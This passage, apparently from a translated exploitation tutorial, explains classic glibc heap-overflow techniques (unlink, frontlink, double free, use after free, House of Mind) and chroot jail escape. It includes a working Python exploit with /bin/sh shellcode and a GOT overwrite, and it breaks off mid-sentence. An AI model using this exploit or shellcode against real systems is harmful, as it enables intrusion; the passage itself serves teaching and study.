–î–ª—è —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å EBP —è–∫ —Ä–µ—î—Å—Ç—Ä –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ –Ω–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∏, –ø—Ä–∏ –∑–º—ñ–Ω—ñ EIP —ñ –≤–∫–∞–∑—ñ–≤–∫–∏ –Ω–∞ system() —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–º—ñ–Ω–∏—Ç–∏ EBP, —â–æ–± –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º'—è—Ç—ñ –∑ –±—É–¥—å-—è–∫–∏–º–∏ 2 –±–∞–π—Ç–∞–º–∏, –∞ –ø–æ—Ç—ñ–º –Ω–∞ –∞–¥—Ä–µ—Å—É &‚Äù/bin/sh‚Äù.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> –í—Å—Ç–∞–Ω–æ–≤–ª—é—î –±–∞–∑–æ–≤—É —Å–∏—Å—Ç–µ–º—É —É –≤–∫–∞–∑–∞–Ω—É –ø—ñ–¥–¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é

–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ –≤–∏–π—Ç–∏ –∑ —Ç–∞–∫–∏—Ö "–∫–ª—ñ—Ç–æ–∫", —Å—Ç–≤–æ—Ä–∏–≤—à–∏: mkdir foo; chroot foo; cd ..

**–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è –∫–æ–¥—É**

Valgrind ‚Äî> –®—É–∫–∞—î –ø–æ–º–∏–ª–∫–∏\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –∫—É–ø–∏: –û—Å–Ω–æ–≤–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏**

**–í–∏–¥—ñ–ª–µ–Ω–∏–π —à–º–∞—Ç–æ–∫**

prev\_size |\
size | ‚Äî–ó–∞–≥–æ–ª–æ–≤–æ–∫\
\*mem | –î–∞–Ω—ñ

**–í—ñ–ª—å–Ω–∏–π —à–º–∞—Ç–æ–∫**

prev\_size |\
size |\
\*fd | –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —à–º–∞—Ç–æ–∫\
\*bk | –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ ‚Äî–ó–∞–≥–æ–ª–æ–≤–æ–∫\
\*mem | –î–∞–Ω—ñ

–í—ñ–ª—å–Ω—ñ —à–º–∞—Ç–∫–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ –ø–æ–¥–≤—ñ–π–Ω–æ –∑–≤'—è–∑–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É (bin) —ñ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–≤–∞ –≤—ñ–ª—å–Ω–∏—Ö —à–º–∞—Ç–∫–∏ –ø–æ—Ä—É—á (—ó—Ö –æ–±'—î–¥–Ω—É—é—Ç—å).

–£ "size" —î –±—ñ—Ç–∏ –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è: —á–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, —á–∏ —à–º–∞—Ç–æ–∫ –±—É–≤ –≤–∏–¥—ñ–ª–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é mmap() —ñ —á–∏ —à–º–∞—Ç–æ–∫ –Ω–∞–ª–µ–∂–∏—Ç—å –¥–æ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –∞—Ä–µ–Ω–∏.

–Ø–∫—â–æ –ø—Ä–∏ –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—ñ —à–º–∞—Ç–∫–∞ —è–∫–∏–π-–Ω–µ–±—É–¥—å –∑ —Å—É—Å—ñ–¥–Ω—ñ—Ö —î –≤—ñ–ª—å–Ω–∏–º, –≤–æ–Ω–∏ –æ–±'—î–¥–Ω—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–∞–∫—Ä–æ—Å–∞ unlink() —ñ –Ω–æ–≤–∏–π –Ω–∞–π–±—ñ–ª—å—à–∏–π —à–º–∞—Ç–æ–∫ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è frontlink() –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ bin.

unlink(){\
BK = P->bk; ‚Äî> BK –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ - —Ü–µ —Ç–æ–π, —è–∫–∏–π –±—É–≤ —É –≤—ñ–ª—å–Ω–æ–º—É —à–º–∞—Ç–∫—É –¥–æ —Ü—å–æ–≥–æ\
FD = P->fd; ‚Äî> FD –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ - —Ü–µ —Ç–æ–π, —è–∫–∏–π –±—É–≤ —É –≤—ñ–ª—å–Ω–æ–º—É —à–º–∞—Ç–∫—É –¥–æ —Ü—å–æ–≥–æ\
FD->bk = BK; ‚Äî> BK –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫\
BK->fd = FD; ‚Äî> FD –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —à–º–∞—Ç–∫–∞ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫\
}

–û—Ç–∂–µ, —è–∫—â–æ –Ω–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∑–º—ñ–Ω–∏—Ç–∏ P->bk –Ω–∞ –∞–¥—Ä–µ—Å—É shellcode —ñ P->fd –Ω–∞ –∞–¥—Ä–µ—Å—É –∑–∞–ø–∏—Å—É –≤ GOT –∞–±–æ DTORS –º—ñ–Ω—É—Å 12, –¥–æ—Å—è–≥–Ω–µ–º–æ:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

–Ü —Ç–∞–∫–∏–º —á–∏–Ω–æ–º shellcode –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è –ø—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ –ø—Ä–æ–≥—Ä–∞–º–∏.

–ö—Ä—ñ–º —Ç–æ–≥–æ, 4-–µ –≤–∏—Ä–∞–∑ unlink() –∑–∞–ø–∏—Å—É—î —â–æ—Å—å, —ñ shellcode –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∞ –¥–ª—è —Ü—å–æ–≥–æ:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> –¶–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–ø–∏—Å—É 4 –±–∞–π—Ç—ñ–≤ –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ 8-–≥–æ –±–∞–π—Ç–∞ shellcode, —Ç–æ–º—É –ø–µ—Ä—à–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è shellcode –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ jmp, —â–æ–± –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–∏ —Ü–µ —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ nops, —è–∫—ñ –≤–µ–¥—É—Ç—å –¥–æ —Ä–µ—à—Ç–∏ shellcode.

–û—Ç–∂–µ, –µ–∫—Å–ø–ª–æ–π—Ç —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —Ç–∞–∫:

–£ –±—É—Ñ–µ—Ä1 –º–∏ –≤—Å—Ç–∞–≤–ª—è—î–º–æ shellcode, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ jmp, —â–æ–± –≤–æ–Ω–∞ –ø–æ—Ç—Ä–∞–ø–∏–ª–∞ –≤ nops –∞–±–æ –¥–æ —Ä–µ—à—Ç–∏ shellcode.

–ü—ñ—Å–ª—è shell code –≤—Å—Ç–∞–≤–ª—è—î–º–æ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è –¥–æ –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –ø–æ–ª—è prev\_size —Ç–∞ size –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞. –í —Ü–∏—Ö –º—ñ—Å—Ü—è—Ö –º–∏ –≤—Å—Ç–∞–≤–ª—è—î–º–æ 0xfffffff0 (—â–æ–± –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ prev\_size, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ –≤—ñ–Ω –≤—ñ–ª—å–Ω–∏–π) —ñ ‚Äú-4‚Äú(0xfffffffc) –≤ size (—â–æ–± –ø—Ä–∏ –ø–µ—Ä–µ–≤—ñ—Ä—Ü—ñ –≤ 3-–º—É —à–º–∞—Ç–∫—É, —á–∏ 2-–π –±—É–≤ –≤—ñ–ª—å–Ω–∏–π, –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –∑–º—ñ–Ω–µ–Ω–æ–≥–æ prev\_size, —è–∫–∏–π —Å–∫–∞–∂–µ, —â–æ –≤—ñ–Ω –≤—ñ–ª—å–Ω–∏–π) -> –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ–ª–∏ free() –¥–æ—Å–ª—ñ–¥–∂—É—î, –≤—ñ–Ω –ø–µ—Ä–µ–π–¥–µ –¥–æ size 3-–≥–æ, –∞ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –ø–µ—Ä–µ–π–¥–µ –¥–æ 2-–≥–æ - 4 —ñ –≤–≤–∞–∂–∞—Ç–∏–º–µ, —â–æ 2-–π —à–º–∞—Ç–æ–∫ –≤—ñ–ª—å–Ω–∏–π. –Ü —Ç–æ–¥—ñ –≤–∏–∫–ª–∏—á–µ **unlink()**.

–ü—Ä–∏ –≤–∏–∫–ª–∏–∫—É unlink() –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ P->fd –ø–µ—Ä—à—ñ –¥–∞–Ω—ñ 2-–≥–æ —à–º–∞—Ç–∫–∞, —Ç–æ–º—É —Ç—É–¥–∏ –≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –∞–¥—Ä–µ—Å–∞, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ - 12 (–æ—Å–∫—ñ–ª—å–∫–∏ –≤ FD->bk –≤—ñ–Ω –¥–æ–¥–∞—Å—Ç—å 12 –¥–æ –∞–¥—Ä–µ—Å–∏, –∑–±–µ—Ä–µ–∂–µ–Ω–æ—ó –≤ FD). –Ü –≤ —Ü—é –∞–¥—Ä–µ—Å—É –≤—Å—Ç–∞–≤–ª—è—î—Ç—å—Å—è –¥—Ä—É–≥–∞ –∞–¥—Ä–µ—Å–∞ –∑ 2-–≥–æ —à–º–∞—Ç–∫–∞, —è–∫–∞ –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –∞–¥—Ä–µ—Å–æ—é shellcode (—Ñ–∞–ª—å—à–∏–≤–∏–π P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #–¶—ñ–∫–∞–≤–æ, —â–æ –±—ñ—Ç, —è–∫–∏–π –≤–∫–∞–∑—É—î, —â–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –≤—ñ–ª—å–Ω–∏–π, –¥–æ—Ä—ñ–≤–Ω—é—î 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, —â–æ–± –≤–≤–∞–∂–∞—Ç–∏, —â–æ "size" 3-–≥–æ —à–º–∞—Ç–∫–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ 4 –±–∞–π—Ç–∏ –ø–æ–∑–∞–¥—É (–≤–∫–∞–∑—É—î –Ω–∞ prev\_size), –æ—Å–∫—ñ–ª—å–∫–∏ —Å–∞–º–µ —Ç–∞–º –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —á–∏ –≤—ñ–ª—å–Ω–∏–π 2-–π —à–º–∞—Ç–æ–∫**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #–£ –ø–µ–π–ª–æ—É–¥—ñ —Å–ø–æ—á–∞—Ç–∫—É –º–∏ –¥–æ–¥–∞—î–º–æ 8 –±–∞–π—Ç—ñ–≤ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è**

**got\_free = pack("\<I", 0x08048300 - 12) #–ê–¥—Ä–µ—Å–∞ free() –≤ plt-12 (—Ü–µ –∞–¥—Ä–µ—Å–∞, —è–∫–∞ –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∞, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ shellcode –ø—Ä–∏ –¥—Ä—É–≥–æ–º—É –≤–∏–∫–ª–∏–∫—É free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #–Ø–∫ –±—É–ª–æ —Å–∫–∞–∑–∞–Ω–æ, –ø–µ–π–ª–æ—É–¥ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ 8 –±–∞–π—Ç—ñ–≤ –∑–∞–ø–æ–≤–Ω–µ–Ω–Ω—è**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #–ú–æ–¥–∏—Ñ—ñ–∫—É—î–º–æ 2-–π —à–º–∞—Ç–æ–∫, got\_free –≤–∫–∞–∑—É—î –Ω–∞ –º—ñ—Å—Ü–µ, –¥–µ –º–∏ –∑–±–µ—Ä–µ–∂–µ–º–æ –∞–¥—Ä–µ—Å—É addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –≤ –∑–≤–æ—Ä–æ—Ç–Ω—å–æ–º—É –Ω–∞–ø—Ä—è–º–∫—É (wargame)**

–ú–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ 3 –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ —à–º–∞—Ç–∫–∏, —è–∫—ñ –≤–∏–≤—ñ–ª—å–Ω—è—é—Ç—å—Å—è —É –∑–≤–æ—Ä–æ—Ç–Ω—å–æ–º—É –ø–æ—Ä—è–¥–∫—É –≤—ñ–¥–≤–µ–¥–µ–Ω–Ω—è.

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É:

–£ —à–º–∞—Ç–∫—É c –º–∏ —Ä–æ–∑–º—ñ—â—É—î–º–æ shellcode

–®–º–∞—Ç–æ–∫ a –º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É b —Ç–∞–∫, —â–æ–± –±—ñ—Ç PREV\_INUSE –±—É–≤ –≤–∏–º–∫–Ω–µ–Ω–∏–π, —â–æ–± –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–≤–∞–∂–∞–ª–∞, —â–æ —à–º–∞—Ç–æ–∫ a –≤—ñ–ª—å–Ω–∏–π.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –≤ —à–∞–ø—Ü—ñ b –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è —Ä–æ–∑–º—ñ—Ä, —â–æ–± –≤—ñ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞–≤ -4.

–û—Ç–∂–µ, –ø—Ä–æ–≥—Ä–∞–º–∞ –≤–≤–∞–∂–∞—Ç–∏–º–µ, —â–æ "a" –≤—ñ–ª—å–Ω–∏–π —ñ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –±—ñ–Ω—ñ, —Ç–æ–º—É –≤–æ–Ω–∞ –≤–∏–∫–ª–∏—á–µ unlink() –¥–ª—è –π–æ–≥–æ —Ä–æ–∑'—î–¥–Ω–∞–Ω–Ω—è. –û–¥–Ω–∞–∫, –æ—Å–∫—ñ–ª—å–∫–∏ —Ä–æ–∑–º—ñ—Ä PREV\_SIZE –¥–æ—Ä—ñ–≤–Ω—é—î -4, –≤–æ–Ω–∞ –≤–≤–∞–∂–∞—Ç–∏–º–µ, —â–æ —à–º–∞—Ç–æ–∫ "a" –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –Ω–∞ b+4. –Ü–Ω—à–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –≤–æ–Ω–∞ –≤–∏–∫–ª–∏—á–µ unlink() –¥–ª—è —à–º–∞—Ç–∫–∞, —è–∫–∏–π –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –Ω–∞ b+4, —Ç–æ–º—É –≤ b+12 –±—É–¥–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ "fd", –∞ –≤ b+16 –±—É–¥–µ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ "bk".

–û—Ç–∂–µ, —è–∫—â–æ –º–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏–º–æ –∞–¥—Ä–µ—Å—É shellcode –≤ bk —ñ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó "puts()"-12 –≤ fd, –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ –Ω–∞—à –ø–µ–π–ª–æ—É–¥.

**–¢–µ—Ö–Ω—ñ–∫–∞ Frontlink**

Frontlink –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ —â–æ—Å—å –≤–∏–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è, —ñ –∂–æ–¥–µ–Ω –∑ –π–æ–≥–æ —Å—É—Å—ñ–¥–Ω—ñ—Ö —à–º–∞—Ç–∫—ñ–≤ –Ω–µ —î –≤—ñ–ª—å–Ω–∏–º, unlink() –Ω–µ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∞–ª–µ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è frontlink().

–ö–æ—Ä–∏—Å–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –∫–æ–ª–∏ –∞—Ç–∞–∫–æ–≤–∞–Ω–∏–π malloc –Ω—ñ–∫–æ–ª–∏ –Ω–µ –≤–∏–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è (free()).

–ü–æ—Ç—Ä—ñ–±–Ω–æ:

–ë—É—Ñ–µ—Ä, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–∏–π —Ñ—É–Ω–∫—Ü—ñ—î—é –≤–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö

–ë—É—Ñ–µ—Ä –ø–æ—Ä—É—á –∑ —Ü–∏–º, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π, —ñ –¥–æ —è–∫–æ–≥–æ –±—É–¥–µ –≤–Ω–µ—Å–µ–Ω–æ –∑–º—ñ–Ω–∏ —É –ø–æ–ª–µ fd –π–æ–≥–æ —à–∞–ø–∫–∏ –∑–∞–≤–¥—è–∫–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—é –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –±—É—Ñ–µ—Ä–∞

–ë—É—Ñ–µ—Ä –¥–ª—è –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –∑ —Ä–æ–∑–º—ñ—Ä–æ–º –±—ñ–ª—å—à–µ 512, –∞–ª–µ –º–µ–Ω—à–µ, –Ω—ñ–∂ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –±—É—Ñ–µ—Ä—ñ

–ë—É—Ñ–µ—Ä, –æ–≥–æ–ª–æ—à–µ–Ω–∏–π –ø–µ—Ä–µ–¥ –∫—Ä–æ–∫–æ–º 3, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ prev\_size —Ü—å–æ–≥–æ

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–¥—ñ–π—Å–Ω—é—é—á–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å –≤ –¥–≤–æ—Ö mallocs –±–µ–∑ –∫–æ–Ω—Ç—Ä–æ–ª—é —ñ –≤ –æ–¥–Ω–æ–º—É –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É, —è–∫–∏–π –≤–∏–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è –ª–∏—à–µ –æ–¥–∏–Ω —Ä–∞–∑, –º–∏ –º–æ–∂–µ–º–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç.

**–ü–æ–¥–≤—ñ–π–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å free()**

–Ø–∫—â–æ free() –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –¥–≤—ñ—á—ñ –∑ —Ç–∏–º —Å–∞–º–∏–º –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º, –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –¥–≤–∞ –±—ñ–Ω–∏, —è–∫—ñ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç—É —Å–∞–º—É –∞–¥—Ä–µ—Å—É.

–Ø–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–æ–≤—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–¥–∏–Ω, –π–æ–≥–æ –º–æ–∂–Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –±–µ–∑ –ø—Ä–æ–±–ª–µ–º. –Ø–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π, –π–æ–º—É –±—É–¥–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ —Ç–æ–π —Å–∞–º–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä, —Ç–æ–º—É –º–∏ –º–∞—Ç–∏–º–µ–º–æ —Ñ–∞–ª—å—à–∏–≤—ñ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ "fd" —ñ "bk" –∑ –¥–∞–Ω–∏–º–∏, —è–∫—ñ –∑–∞–ø–∏—Å—É—î –ø–æ–ø–µ—Ä–µ–¥–Ω—î –≤–∏–¥—ñ–ª–µ–Ω–Ω—è.

**–ü—ñ—Å–ª—è free()**

–†–∞–Ω—ñ—à–µ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑–Ω–æ–≤—É –±–µ–∑ –∫–æ–Ω—Ç—Ä–æ–ª—é.

## **8 –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –∫—É–ø–∏: –†–æ–∑—à–∏—Ä–µ–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏**

–¢–µ—Ö–Ω—ñ–∫–∏ Unlink() —Ç–∞ FrontLink() –±—É–ª–∏ –≤–∏–¥–∞–ª–µ–Ω—ñ –ø—Ä–∏ –∑–º—ñ–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó unlink().

**The house of mind**

–î–ª—è –≤–∏–∫–ª–∏–∫—É –∫–æ–¥—É –∑–∞ –≤–ª–∞—Å–Ω–∏–º –≤–∏–±–æ—Ä–æ–º –ø–æ—Ç—Ä—ñ–±–µ–Ω –ª–∏—à–µ –æ–¥–∏–Ω –≤–∏–∫–ª–∏–∫ free(). –¶—ñ–∫–∞–≤–æ –∑–Ω–∞–π—Ç–∏ –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–∏–π –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º —ñ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π.

–í–∏–∫–ª–∏–∫ free() –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫–ª–∏–∫—É public\_fREe(mem), —è–∫–∏–π —Ä–æ–±–∏—Ç—å:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> –ü–æ–≤–µ—Ä—Ç–∞—î –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –∞–¥—Ä–µ—Å—É –ø–æ—á–∞—Ç–∫—É —à–º–∞—Ç–∫–∞ (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

–£ \[1] –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø–æ–ª–µ size –±—ñ—Ç NON\_MAIN\_ARENA, —è–∫–µ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–≤–µ—Ä—Ç–∞–ª–∞ true —ñ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞—Å—è heap\_for\_ptr(), —è–∫–∞ –≤–∏–∫–æ–Ω—É—î and –¥–æ "mem", –∑–º—ñ–Ω—é—é—á–∏ –Ω–∞ 0 2,5 –º–µ–Ω—à –≤–∞–∂–ª–∏–≤–∏—Ö –±–∞–π—Ç—ñ–≤ (—É –Ω–∞—à–æ–º—É –≤–∏–ø–∞–¥–∫—É –∑ 0x0804a000 –≤–∏—Ö–æ–¥–∏—Ç—å 0x08000000) —ñ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ 0x08000000->ar\_ptr (—è–∫ –¥–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ heap\_info)

–û—Ç–∂–µ, —è–∫—â–æ –º–∏ –º–æ–∂–µ–º–æ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —à–º–∞—Ç–æ–∫, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —É 0x0804a000, —ñ —à–º–∞—Ç–æ–∫ —É **0x081002a0** –±—É–¥–µ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π, –º–∏ –º–æ–∂–µ–º–æ –¥—ñ—Å—Ç–∞—Ç–∏—Å—è –¥–æ –∞–¥—Ä–µ—Å–∏ 0x08100000 —ñ –∑–∞–ø–∏—Å–∞—Ç–∏ —Ç—É–¥–∏ –≤—Å–µ, —â–æ –∑–∞–≤–≥–æ–¥–Ω–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ **0x0804a000**. –ö–æ–ª–∏ —Ü–µ–π –¥—Ä—É–≥–∏–π —à–º–∞—Ç–æ–∫ –±—É–¥–µ –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π, –≤—ñ–Ω –ø–æ–±–∞—á–∏—Ç—å, —â–æ heap\_for\_ptr(ptr)->ar\_ptr –ø–æ–≤–µ—Ä—Ç–∞—î —Ç–µ, —â–æ –º–∏ –∑–∞–ø–∏—Å–∞–ª–∏ –≤ 0x08100000 (–æ—Å–∫—ñ–ª—å–∫–∏ –¥–æ 0x081002a0 –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è and, —è–∫–∏–π –º–∏ 